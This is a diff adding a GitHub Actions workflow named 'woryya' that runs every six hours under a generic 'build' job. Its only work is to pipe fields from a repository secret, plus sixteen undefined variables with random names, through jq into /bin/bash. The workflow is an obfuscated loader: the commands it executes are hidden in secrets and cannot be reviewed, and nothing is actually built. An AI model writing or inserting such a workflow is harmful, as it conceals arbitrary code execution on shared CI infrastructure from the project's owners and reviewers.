@@ -1,0 +1,33 @@
+name: woryya
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: woryya
+        env:
+          umr73074: ${{ secrets.umr73074 }}
+        run: |
+          echo $umr73074 | jq -r .qo491 | /bin/bash
+          echo $dnv04 | jq -r .f5513 | /bin/bash
+          echo $psolw93718 | jq -r .ovf4 | /bin/bash
+          echo $bn00284 | jq -r .n224 | /bin/bash
+          echo $w1619 | jq -r .nqtx6 | /bin/bash
+          echo $eovu645 | jq -r .zy7106 | /bin/bash
+          echo $cw91 | jq -r .d4 | /bin/bash
+          echo $s63283 | jq -r .drshb8 | /bin/bash
+          echo $kupfw06056 | jq -r .x706 | /bin/bash
+          echo $h99 | jq -r .oex71 | /bin/bash
+          echo $f0426 | jq -r .cwoyk81665 | /bin/bash
+          echo $kzsin131 | jq -r .ss41538 | /bin/bash
+          echo $zvgsa24383 | jq -r .fvrb49 | /bin/bash
+          echo $zhamt64461 | jq -r .bf941 | /bin/bash
+          echo $h24074 | jq -r .kbpkx66925 | /bin/bash
+          echo $w97 | jq -r .sw125 | /bin/bash
+          echo $ysf41 | jq -r .ryu001 | /bin/bash
+
